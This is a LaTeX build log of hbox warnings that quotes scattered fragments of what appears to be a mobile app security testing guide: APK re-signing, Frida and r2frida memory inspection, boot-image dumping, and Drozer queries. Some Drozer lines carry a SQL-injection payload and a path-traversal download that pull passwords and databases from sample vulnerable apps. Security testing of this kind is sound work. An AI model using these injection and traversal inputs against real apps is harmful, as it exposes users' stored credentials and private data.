Overfull \hbox (116.43965pt too wide) in paragraph at lines 15533--15536
[]\TU/SourceSansPro(0)/m/n/10.95 Note that the Android Studio build tools direc
tory must be in the path. It is located at \TU/SourceCodePro(6)/m/n/10.95 [SDK-
Path]/build-tools/[version]\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (20.45732pt too wide) in paragraph at lines 15540--15545
\TU/SourceSansPro(0)/m/n/10.95 fore, the IDE has already created a debug keysto
re and certificate in \TU/SourceCodePro(6)/m/n/10.95 $HOME/.android/debug.keyst
ore\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (244.4694pt too wide) in paragraph at lines 15552--15552
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -genkey -v -keystore ~/.android/debu
g.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000[] 
[278]
Overfull \hbox (156.86937pt too wide) in paragraph at lines 15560--15560
[]\TU/SourceCodePro(6)/m/n/10.95 $ apksigner sign --ks  ~/.android/debug.keysto
re --ks-key-alias signkey UnCrackable-Repackaged.apk[] 

Overfull \hbox (134.96939pt too wide) in paragraph at lines 15569--15569
[]\TU/SourceCodePro(6)/m/n/10.95 $ jarsigner -verbose -keystore ~/.android/debu
g.keystore ../UnCrackable-Repackaged.apk signkey[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d4138675f1560de187de0888b5d85fc997c30b87.
png" > [279]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5dca12a550e25ea0d8869ad28a3f1018e7b054bd.
png" > [280]
Overfull \hbox (10.73807pt too wide) in paragraph at lines 15646--15649
[]\TU/SourceSansPro(0)/m/n/10.95 Put the \TU/SourceSansPro(0)/m/it/10.95 patche
d code \TU/SourceSansPro(0)/m/n/10.95 on a single line and copy it in the origi
nal \TU/SourceCodePro(6)/m/n/10.95 assets/index.android.bundle
[281]
Overfull \hbox (27.52444pt too wide) in paragraph at lines 15705--15708
[]\TU/SourceSansPro(0)/m/n/10.95 An Android application’s decompiled smali code
 can be patched to introduce a call to \TU/SourceCodePro(6)/m/n/10.95 System.lo
adLibrary\TU/SourceSansPro(0)/m/n/10.95 .
[282] [283] [284]
Overfull \hbox (29.84938pt too wide) in paragraph at lines 15921--15921
[]\TU/SourceCodePro(6)/m/n/10.95 [Huawei Nexus 6P::sg.vantagepoint.helloworldjn
i]-> Process.enumerateModules()[] 
[285] [286] [287]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/65d9911c121984364aa4dd59d11f9e12cbaba7b1.
png" > [288] [289] [290]
Overfull \hbox (15.5245pt too wide) in paragraph at lines 16161--16161
\TU/SourceCodePro(6)/m/n/10 Base64.[]decode[]((String)[]"5UJiFctbmgbDoLXmpL12mk
no8HT4Lv8dlat8FxR2GOc="[], 
[291] [292]
Overfull \hbox (97.73936pt too wide) in paragraph at lines 16242--16242
[]\TU/SourceCodePro(6)/m/n/10.95 [USB::Android Emulator 5554::sg.vantagepoint.u
ncrackable1]-> [*] MainActivity.a modified[] 
[293] [294]
Overfull \hbox (12.32942pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.helloworldjni on (google: 8.1.
0) [usb] # memory list modules[] 

Overfull \hbox (522.59837pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------------------------------
-  ------------  --------------------  ----------------------------------------
----------------------------[] 

Overfull \hbox (152.48962pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 app_process64                                 
   0x558b1fd000  32768 (32.0 KiB)      /system/bin/app_process64[] 
[295]
Overfull \hbox (237.89957pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libandroid_runtime.so                         
   0x7dbc859000  1982464 (1.9 MiB)     /system/lib64/libandroid_runtime.so[] 

Overfull \hbox (161.2496pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libbinder.so                                  
   0x7dbf5d7000  557056 (544.0 KiB)    /system/lib64/libbinder.so[] 

Overfull \hbox (156.86963pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libcutils.so                                  
   0x7dbff4d000  77824 (76.0 KiB)      /system/lib64/libcutils.so[] 

Overfull \hbox (178.76959pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libhwbinder.so                                
   0x7dbfd13000  163840 (160.0 KiB)    /system/lib64/libhwbinder.so[] 

Overfull \hbox (384.62955pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 base.odex                                     
   0x7d10dd0000  442368 (432.0 KiB)    /data/app/sg.vantagepoint.helloworldjni-
1/oat/arm64/base.odex[] 

Overfull \hbox (441.56952pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libnative-lib.so                              
   0x7d1c499000  73728 (72.0 KiB)      /data/app/sg.vantagepoint.helloworldjni-
1/lib/arm64/libnative-lib.so[] 

Overfull \hbox (34.01901pt too wide) in paragraph at lines 16416--16420
[]\TU/SourceSansPro(0)/m/n/10.95 You can adjust your search by using the search
 settings \TU/SourceCodePro(6)/m/n/10.95 \e~search\TU/SourceSansPro(0)/m/n/10.9
5 . For example, \TU/SourceCodePro(6)/m/n/10.95 \e search.quiet=true;
[296] [297] [298]
Overfull \hbox (200.66937pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.helloworldjni on (google: 8.1.
0) [usb] # memory dump all /Users/foo/memory_Android/memory[] 

Overfull \hbox (408.71915pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 1002.8 MiB from base: 0x14140000  [---
---------------------------------]    0%  00:11:03(session detach message) proc
ess-terminated[] 

Overfull \hbox (69.26944pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 8.0 MiB from base: 0x7fc753e000  [####
################################]  100%[] 
[299]
Overfull \hbox (125.82916pt too wide) in paragraph at lines 16642--16646
[]\TU/SourceSansPro(0)/m/n/10.95 We’ll keep using the HelloWorld JNI app, open 
a session with r2frida \TU/SourceCodePro(6)/m/n/10.95 r2 frida://usb//sg.vantag
epoint.helloworldjni
[300]
Overfull \hbox (88.97942pt too wide) in paragraph at lines 16674--16674
[]\TU/SourceCodePro(6)/m/n/10.95 extCacheDir         /storage/emulated/0/Androi
d/data/sg.vantagepoint.helloworldjni/cache[] 

Overfull \hbox (32.03943pt too wide) in paragraph at lines 16674--16674
[]\TU/SourceCodePro(6)/m/n/10.95 obbDir              /storage/emulated/0/Androi
d/obb/sg.vantagepoint.helloworldjni[] 
[301]
Overfull \hbox (117.44937pt too wide) in paragraph at lines 16732--16732
[]\TU/SourceCodePro(6)/m/n/10.95 [0x00000000]> \ic sg.vantagepoint.helloworldjn
i.MainActivity~sg.vantagepoint.helloworldjni[] 

Overfull \hbox (108.68938pt too wide) in paragraph at lines 16732--16732
[]\TU/SourceCodePro(6)/m/n/10.95 public native java.lang.String sg.vantagepoint
.helloworldjni.MainActivity.stringFromJNI()[] 

Overfull \hbox (67.07942pt too wide) in paragraph at lines 16788--16788
[]            \TU/SourceCodePro(6)/m/n/10.95 ;-- sym.fun.Java_sg_vantagepoint_h
elloworldjni_MainActivity_stringFromJNI:[] 
[302]
Overfull \hbox (53.93956pt too wide) in paragraph at lines 16788--16788
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x7d1c499558      029d42f9       l
dr x2, [x8, 0x538]       ; [0x538:4]=-1 ; 1336[] 
[303] [304]
Overfull \hbox (279.50932pt too wide) in paragraph at lines 16882--16882
[]\TU/SourceCodePro(6)/m/n/10.95 cmdline = console=ttyHSL0,115200,n8 androidboo
t.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1[] 
[305] [306]
Overfull \hbox (277.3193pt too wide) in paragraph at lines 16994--16994
[]\TU/SourceCodePro(6)/m/n/10.95 $ build/tools/make-standalone-toolchain.sh --a
rch=arm --platform=android-24 --install-dir=/tmp/my-android-toolchain[] 

Overfull \hbox (23.27953pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 DDR -> /dev/block/mmcblk0p24[] 

Overfull \hbox (29.84952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 aboot -> /dev/block/mmcblk0p6[] 

Overfull \hbox (42.98952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 abootb -> /dev/block/mmcblk0p11[] 

Overfull \hbox (29.84953pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 boot -> /dev/block/mmcblk0p19[] 

Overfull \hbox (56.12952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 userdata -> /dev/block/mmcblk0p28[] 

Overfull \hbox (7.9494pt too wide) in paragraph at lines 17026--17026
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb shell "su -c dd if=/dev/block/mmcblk0p19
 of=/data/local/tmp/boot.img"[] 
[307]
Overfull \hbox (1015.3492pt too wide) in paragraph at lines 17057--17057
[]\TU/SourceCodePro(6)/m/n/10.95 $ fastboot boot zImage-dtb initrd.img --base 0
 --kernel-offset 0x8000 --ramdisk-offset 0x2900000 --tags-offset 0x2700000 -c "
console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 maxcpus
=2 msm_watchdog_v2.enable=1"[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/79cc611a9662b42c800f698e259e4a68828ed1c9.
jpg" > [308]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2b3a00354d9a95a605f5ab9905e3b4d4e39d9c5a.
jpg" > [309]
Overfull \hbox (26.24696pt too wide) in paragraph at lines 17122--17125
[]\TU/SourceSansPro(0)/m/n/10.95 You can find the function prototypes for all s
ystem calls in the kernel header file arch/arm/include/asm/unistd.h.
[310] [311]
Overfull \hbox (290.45944pt too wide) in paragraph at lines 17183--17183
[]        \TU/SourceCodePro(6)/m/n/10.95 make ARCH=arm CROSS_COMPILE=$(TOOLCHAI
N)/bin/arm-eabi- -C $(KERNEL) M=$(shell pwd) CFLAGS_MODULE=-fno-pic modules[] 
[312] [313]
Overfull \hbox (128.3994pt too wide) in paragraph at lines 17275--17275
[]\TU/SourceCodePro(6)/m/n/10.95 $ /tmp/my-android-toolchain/bin/arm-linux-andr
oideabi-gcc -pie -fpie -o kmem_util kmem_util.c[] 
[314]
Underfull \hbox (badness 2205) in paragraph at lines 17339--17342
[]\TU/SourceSansPro(0)/m/n/10.95 Attacking Android Applications with Debuggers 
(19 January 2015) - [][]$[][][][][] [] [] [] [][][][] [] [][][][][][] [] [][][]
 []

Underfull \hbox (badness 4886) in paragraph at lines 17345--17348
[]\TU/SourceSansPro(0)/m/n/10.95 Update on Development of Xposed for Nougat - [
][]$[][][][][] [] [] [] [][][] [] [][][] [][] [][][][][][][][][][] [] [][][] []
 [][][][][][] [][]
[315] [316]
Overfull \hbox (100.98427pt too wide) in paragraph at lines 17509--17511
[]\TU/SourceSansPro(0)/m/n/10.95 The username and password are stored in clear 
text in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/shared_prefs/k
ey.xml\TU/SourceSansPro(0)/m/n/10.95 . 
[317]
Overfull \hbox (10.13937pt too wide) in paragraph at lines 17533--17533
[]\TU/SourceCodePro(6)/m/n/10.95 root@hermes:/data/data/sg.vp.owasp_mobile.myfi
rstapp/shared_prefs # ls -la[] 

Overfull \hbox (79.92378pt too wide) in paragraph at lines 17563--17567
\TU/SourceSansPro(0)/m/n/10.95 vided data and stored in the clear text file \TU
/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/databases/privateNotSoSec
ure\TU/SourceSansPro(0)/m/n/10.95 . 
[318] [319]
Underfull \hbox (badness 6063) in paragraph at lines 17709--17713
\TU/SourceSansPro(0)/m/n/10.95 this access with \TU/SourceCodePro(6)/m/n/10.95 
MODE_PRIVATE\TU/SourceSansPro(0)/m/n/10.95 . Modes such as \TU/SourceCodePro(6)
/m/n/10.95 MODE_WORLD_READABLE \TU/SourceSansPro(0)/m/n/10.95 (deprecated) and
[320]
Overfull \hbox (10.26721pt too wide) in paragraph at lines 17756--17764
[]\TU/SourceSansPro(0)/m/n/10.95 It’s also worth knowing that files stored outs
ide the application folder (\TU/SourceCodePro(6)/m/n/10.95 data/data/<package-n
ame>/\TU/SourceSansPro(0)/m/n/10.95 )

Underfull \hbox (badness 3291) in paragraph at lines 17779--17783
[]\TU/SourceSansPro(0)/m/n/10.95 Check \TU/SourceCodePro(6)/m/n/10.95 AndroidMa
nifest.xml \TU/SourceSansPro(0)/m/n/10.95 for read/write external storage permi
ssions, for example,

Overfull \hbox (29.5756pt too wide) in paragraph at lines 17779--17783
\TU/SourceCodePro(6)/m/n/10.95 uses-permission android:name="android.permission
.WRITE_EXTERNAL_STORAGE"\TU/SourceSansPro(0)/m/n/10.95 . 

Underfull \hbox (badness 5008) in paragraph at lines 17794--17802
[]\TU/SourceCodePro(6)/m/n/10.95 MODE_WORLD_READABLE \TU/SourceSansPro(0)/m/n/1
0.95 or \TU/SourceCodePro(6)/m/n/10.95 MODE_WORLD_WRITABLE\TU/SourceSansPro(0)/
m/n/10.95 : You should avoid using
[321] [322]
Overfull \hbox (15.61441pt too wide) in paragraph at lines 17920--17920
 []    \TU/SourceCodePro(6)/m/n/10.95 buildConfigField "String", "hiddenPasswor
d", "\"${hiddenPassword}\""[] 
[323]
Underfull \hbox (badness 1127) in paragraph at lines 17979--17991
\TU/SourceSansPro(0)/m/n/10.95 droid 9 (API level 28) introduces the \TU/Source
CodePro(6)/m/n/10.95 unlockedDeviceRequied \TU/SourceSansPro(0)/m/n/10.95 flag.
 By passing \TU/SourceCodePro(6)/m/n/10.95 true \TU/SourceSansPro(0)/m/n/10.95 
to the
[324]
Overfull \hbox (82.96791pt too wide) in paragraph at lines 18063--18068
\TU/SourceSansPro(0)/m/n/10.95 the server and should then retrieve the attestat
ion certificate chain using the \TU/SourceCodePro(6)/m/n/10.95 KeyStore.getCert
ificateChain
[325]
Overfull \hbox (159.5245pt too wide) in paragraph at lines 18135--18135
[]\TU/SourceCodePro(6)/m/n/10 "308202ca30820270a003020102020101300a06082a8648ce
3d040302308188310b30090603550406130..."[][],[]|  

Overfull \hbox (159.5245pt too wide) in paragraph at lines 18136--18136
[]\TU/SourceCodePro(6)/m/n/10 "308202783082021ea00302010202021001300a06082a8648
ce3d040302308198310b300906035504061..."[][],[]|  

Overfull \hbox (153.5245pt too wide) in paragraph at lines 18137--18137
[]\TU/SourceCodePro(6)/m/n/10 "3082028b30820232a003020102020900a2059ed10e435b57
300a06082a8648ce3d040302308198310b3..."[]|  
[326] [327]
Underfull \hbox (badness 1596) in paragraph at lines 18277--18284
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that the app is using the Android Ke
yStore and Cipher mechanisms to securely

Underfull \hbox (badness 4846) in paragraph at lines 18277--18284
\TU/SourceSansPro(0)/m/n/10.95 store encrypted information on the device. Look 
for the patterns \TU/SourceCodePro(6)/m/n/10.95 AndroidKeystore\TU/SourceSansPr
o(0)/m/n/10.95 ,

Underfull \hbox (badness 3861) in paragraph at lines 18277--18284
\TU/SourceCodePro(6)/m/n/10.95 import java.security.KeyStore\TU/SourceSansPro(0
)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 import javax.crypto.Cipher\TU/Sour
ceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 import
[328] [329] [330]
Overfull \hbox (61.24603pt too wide) in paragraph at lines 18463--18473
[]\TU/SourceSansPro(0)/m/n/10.95 Check Shared Preferences that are stored as XM
L files (in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/shared_pre
fs\TU/SourceSansPro(0)/m/n/10.95 )

Overfull \hbox (0.60928pt too wide) in paragraph at lines 18480--18487
[]\TU/SourceSansPro(0)/m/n/10.95 Determine whether a Realm database is availabl
e in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/files/\TU/SourceS
ansPro(0)/m/n/10.95 ,
[331] [332]
Underfull \hbox (badness 1946) in paragraph at lines 18569--18571
[]\TU/SourceSansPro(0)/m/n/10.95 You should check the apps’ source code for log
ging mechanisms by searching for the following

Underfull \hbox (badness 1231) in paragraph at lines 18611--18619
\TU/SourceSansPro(0)/m/n/10.95 check the ProGuard configuration file (proguard-
rules.pro) for the following options (according to
[333]
Underfull \hbox (badness 2846) in paragraph at lines 18656--18661
[]\TU/SourceSansPro(0)/m/n/10.95 ProGuard guarantees removal of the \TU/SourceC
odePro(6)/m/n/10.95 Log.v \TU/SourceSansPro(0)/m/n/10.95 method call. Whether t
he rest of the code (\TU/SourceCodePro(6)/m/n/10.95 new

Underfull \hbox (badness 1005) in paragraph at lines 18688--18697
[]\TU/SourceSansPro(0)/m/n/10.95 Many application developers still use \TU/Sour
ceCodePro(6)/m/n/10.95 System.out.println \TU/SourceSansPro(0)/m/n/10.95 or \TU
/SourceCodePro(6)/m/n/10.95 printStackTrace \TU/SourceSansPro(0)/m/n/10.95 inst
ead of

Underfull \hbox (badness 1199) in paragraph at lines 18688--18697
\TU/SourceSansPro(0)/m/n/10.95 a proper logging class. Therefore, your testing 
strategy must include all output generated while

Underfull \hbox (badness 2150) in paragraph at lines 18688--18697
\TU/SourceSansPro(0)/m/n/10.95 the application is starting, running and closing
. To determine what data is directly printed by
[334]
Overfull \hbox (12.3294pt too wide) in paragraph at lines 18703--18703
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb logcat | grep "$(adb shell ps | grep <pa
ckage-name> | awk []{print $2}[])"[] 

Underfull \hbox (badness 1052) in paragraph at lines 18710--18715
[]\TU/SourceSansPro(0)/m/n/10.95 You may also want to apply further filters or 
regular expressions (using \TU/SourceCodePro(6)/m/n/10.95 logcat\TU/SourceSansP
ro(0)/m/n/10.95 ’s regex flags \TU/SourceCodePro(6)/m/n/10.95 -e
[335] [336]
Overfull \hbox (21.40335pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 use \TU/SourceCodePro(6)/m/n/10.95 android:permi
ssion\TU/SourceSansPro(0)/m/n/10.95 , other applications must declare correspon
ding \TU/SourceCodePro(6)/m/n/10.95 <uses-permission>

Overfull \hbox (100.0037pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 elements in their manifests to interact with you
r content provider. You can use the \TU/SourceCodePro(6)/m/n/10.95 android:gran
tUriPermissions

Overfull \hbox (65.1985pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 attribute to grant more specific access to other
 apps; you can limit access with the \TU/SourceCodePro(6)/m/n/10.95 <grant-uri-
permission>
[337]
Underfull \hbox (badness 1540) in paragraph at lines 18904--18907
[]\TU/SourceSansPro(0)/m/n/10.95 We will use the vulnerable password manager ap
p [][]Sieve[][] as an example of a vulnerable content
[338] [339]
Overfull \hbox (1.56197pt too wide) in paragraph at lines 19011--19014
[]\TU/SourceSansPro(0)/m/n/10.95 To identify content provider URIs within the a
pplication, use Drozer’s \TU/SourceCodePro(6)/m/n/10.95 scanner.provider.findur
is

Overfull \hbox (165.62936pt too wide) in paragraph at lines 19037--19037
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --vertical[] 
[340]
Underfull \hbox (badness 2573) in paragraph at lines 19075--19080
\TU/SourceSansPro(0)/m/n/10.95 are based on SQL, they may be vulnerable to SQL 
injection. You can use the Drozer module

Underfull \hbox (badness 2582) in paragraph at lines 19075--19080
\TU/SourceCodePro(6)/m/n/10.95 app.provider.query \TU/SourceSansPro(0)/m/n/10.9
5 to test for SQL injection by manipulating the projection and selection

Overfull \hbox (202.85933pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "[]"[] 

Overfull \hbox (99.92941pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 unrecognized token: "[] FROM Passwords" (code 
1): , while compiling: SELECT [] FROM Passwords[] 

Overfull \hbox (196.28934pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --selection "[]"[] 

Overfull \hbox (73.6494pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 unrecognized token: "[])" (code 1): , while co
mpiling: SELECT * FROM Passwords WHERE ([])[] 

Overfull \hbox (196.28935pt too wide) in paragraph at lines 19102--19102
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "*[] 
[341]
Overfull \hbox (277.31935pt too wide) in paragraph at lines 19111--19111
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"[] 

Overfull \hbox (566.39923pt too wide) in paragraph at lines 19145--19145
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.download content://com.vu
lnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/
database.db /home/user/database.db[] 

Underfull \hbox (badness 1789) in paragraph at lines 19147--19150
[]\TU/SourceSansPro(0)/m/n/10.95 Use the \TU/SourceCodePro(6)/m/n/10.95 scanner
.provider.traversal \TU/SourceSansPro(0)/m/n/10.95 module to automate the proce
ss of finding content
[342]
Overfull \hbox (194.09937pt too wide) in paragraph at lines 19166--19166
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb shell content query --uri content://com.
owaspomtg.vulnapp.provider.CredentialProvider/credentials[] 
[343] [344] [345]
Overfull \hbox (327.68936pt too wide) in paragraph at lines 19407--19407
[]\TU/SourceCodePro(6)/m/n/10.95 $ dd if=backup.ab bs=1 skip=24 | python -c "im
port zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
[] 

Overfull \hbox (7.94939pt too wide) in paragraph at lines 19430--19430
[]\TU/SourceCodePro(6)/m/n/10.95 $ abe [-debug] [-useenv=yourenv] unpack <backu
p.ab> <backup.tar> [password][] 
[346]
Overfull \hbox (69.62175pt too wide) in paragraph at lines 19511--19514
[]\TU/SourceSansPro(0)/m/n/10.95 [Images/Chapters/0x05d/2.png](Images/Chapters/
0x05d/1.png” 

Overfull \hbox (136.94234pt too wide) in paragraph at lines 19511--19514
\TU/SourceSansPro(0)/m/n/10.95 width=“500px](Images/Chapters/0x05d/2.png](Image
s/Chapters/0x05d/1.png” 
[347]
Overfull \hbox (176.03922pt too wide) in paragraph at lines 19518--19527
[]\TU/SourceSansPro(0)/m/n/10.95 On devices supporting [][]file-based encryptio
n (FBE)[][], snapshots are stored in the \TU/SourceCodePro(6)/m/n/10.95 /data/s
ystem_ce/<USER_ID>/<IMAGE_FOLDER_NAME>

Overfull \hbox (17.3786pt too wide) in paragraph at lines 19518--19527
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 recent_images
\TU/SourceSansPro(0)/m/n/10.95 . If the device doesn’t support FBE, the \TU/Sou
rceCodePro(6)/m/n/10.95 /data/system/<IMAGE_FOLDER_NAME>
[348] [349] [350] [351] [352] [353] [354]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e9acff65016bb9e041e6fed3ec844f8e4df0cae9.
png" > [355]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5714378441f6a767b5bf09078d621a244d4d9fc2.
png" > [356] [357] [358]
Underfull \hbox (badness 10000) in paragraph at lines 20219--20222
[]\TU/SourceSansPro(0)/m/n/10.95 Memory Monitor - [][]$[][][][] [] [] [] [][][]
[][][][][][] [] [][][][][][][] [] [][][] [] [][][][][] [] [][][][][][][][][] []
 [][][][][][][][][] [][] [][][][][][] [] [][][][] []
[359]
Underfull \hbox (badness 1112) in paragraph at lines 20281--20290
[]\TU/SourceSansPro(0)/m/n/10.95 Android cryptography APIs are based on the Jav
a Cryptography Architecture (JCA). JCA separates
[360]
Underfull \hbox (badness 1540) in paragraph at lines 20364--20373
[]\TU/SourceSansPro(0)/m/n/10.95 Conscrypt, known as \TU/SourceCodePro(6)/m/n/1
0.95 AndroidOpenSSL\TU/SourceSansPro(0)/m/n/10.95 , is preferred above using Bo
uncy Castle and

Underfull \hbox (badness 2042) in paragraph at lines 20364--20373
\TU/SourceSansPro(0)/m/n/10.95 it has new implementations: \TU/SourceCodePro(6)
/m/n/10.95 AlgorithmParameters:GCM \TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceC
odePro(6)/m/n/10.95 KeyGenerator:AES\TU/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 10000) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:DESEDE\TU/SourceSansPro(0)/m/n/10.9
5 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACMD5\TU/SourceSansPro(0)/m/n
/10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA1\TU/SourceSansPro(
0)/m/n/10.95 ,

Overfull \hbox (45.35818pt too wide) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA224\TU/SourceSansPro(0)/m/n/
10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA256\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA384\TU/Sourc
eSansPro(0)/m/n/10.95 ,

Overfull \hbox (63.71037pt too wide) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA512\TU/SourceSansPro(0)/m/n/
10.95 , \TU/SourceCodePro(6)/m/n/10.95 SecretKeyFactory:DESEDE\TU/SourceSansPro
(0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 Signature:NONEWITHECDSA\TU/S
ourceSansPro(0)/m/n/10.95 . 

Underfull \hbox (badness 2990) in paragraph at lines 20373--20376
[]\TU/SourceSansPro(0)/m/n/10.95 You should not use the \TU/SourceCodePro(6)/m/
n/10.95 IvParameterSpec.class \TU/SourceSansPro(0)/m/n/10.95 anymore for GCM, b
ut use the

Overfull \hbox (22.53477pt too wide) in paragraph at lines 20376--20380
[]\TU/SourceSansPro(0)/m/n/10.95 Sockets have changed from \TU/SourceCodePro(6)
/m/n/10.95 OpenSSLSocketImpl \TU/SourceSansPro(0)/m/n/10.95 to \TU/SourceCodePr
o(6)/m/n/10.95 ConscryptFileDescriptorSocket\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (50.72498pt too wide) in paragraph at lines 20400--20402
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 Crypto \TU/
SourceSansPro(0)/m/n/10.95 security provider is now removed. Calling it will re
sult in a \TU/SourceCodePro(6)/m/n/10.95 NoSuchProviderException\TU/SourceSansP
ro(0)/m/n/10.95 . 
[361]
Underfull \hbox (badness 5260) in paragraph at lines 20426--20429
[]\TU/SourceSansPro(0)/m/n/10.95 You should stop specifying a security provider
 and use the default implementation (An-
[362]
Overfull \hbox (40.79941pt too wide) in paragraph at lines 20487--20487
[]\TU/SourceCodePro(6)/m/n/10.95 provider: Crypto1.0 (HARMONY (SHA1 digest; Sec
ureRandom; SHA1withDSA signature))[] 

Overfull \hbox (42.98943pt too wide) in paragraph at lines 20500--20500
[]\TU/SourceCodePro(6)/m/n/10.95 provider: CertPathProvider 1.0(Provider of Cer
tPathBuilder and CertPathVerifier)[] 

Overfull \hbox (205.04938pt too wide) in paragraph at lines 20500--20500
[]\TU/SourceCodePro(6)/m/n/10.95 provider: AndroidKeyStoreBCWorkaround 1.0(Andr
oid KeyStore security provider to work around Bouncy Castle)[] 

Underfull \hbox (badness 1924) in paragraph at lines 20506--20513
[]\TU/SourceSansPro(0)/m/n/10.95 Keeping up-to-date and patched component is on
e of security principles. The same applies to
[363]
Underfull \hbox (badness 1082) in paragraph at lines 20562--20570
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 KeyGenParam
eterSpec \TU/SourceSansPro(0)/m/n/10.95 indicates that the key can be used for 
encryption and decryption,
[364]
Underfull \hbox (badness 3849) in paragraph at lines 20627--20630
[]\TU/SourceSansPro(0)/m/n/10.95 Since the IV is randomly generated each time, 
it should be saved along with the cipher text
[365] [366] [367]
Underfull \hbox (badness 1264) in paragraph at lines 20797--20800
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[368]
Overfull \hbox (17.84456pt too wide) in paragraph at lines 20894--20897
